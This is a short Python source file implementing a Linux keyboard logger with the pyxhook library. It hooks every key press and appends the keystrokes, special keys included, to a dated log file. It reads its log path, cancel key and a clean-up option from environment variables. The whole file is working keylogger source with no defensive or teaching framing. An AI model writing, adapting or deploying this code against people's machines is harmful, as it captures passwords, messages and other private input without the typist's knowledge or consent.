import os
import pyxhook
from datetime import datetime

today  = datetime.today().strftime('%d-%m-%Y')
currentDirectory = os.path.dirname(__file__)
os.makedirs(os.path.join(currentDirectory , 'Logs') , exist_ok=True) 

logFile   = os.environ.get('pyloggerFile' , os.path.expanduser(os.path.join(currentDirectory , 'Logs' , f'{today}.log')))
cancelKey = ord(os.environ.get('pyloggerCancel' , '`')[0])

if os.environ.get('pyloggerClean' , None) is not None:
  try:
    os.remove(logFile)
  except EnvironmentError:
    pass

def onKeyPress(event):
  with open(logFile , 'a') as f:
    s = event.Key
    if s == 'Return':
      f.write('\n')
    elif s == 'Tab':
      f.write('\t')
    elif s == 'space':
      f.write(' ')
    elif len(s) > 1:
      f.write(f'[{event.Key}]')
    else: 
      f.write(f'{event.Key}')

newHook = pyxhook.HookManager()
newHook.KeyDown = onKeyPress
newHook.HookKeyboard()

try:
  newHook.start()
except KeyboardInterrupt:
  pass
except Exception as e:
  message = f'Error while catching events: {e}\n'
  pyxhook.print_err(message)
  with open(logFile , 'a') as f:
    f.write(f'\n{message}\n')
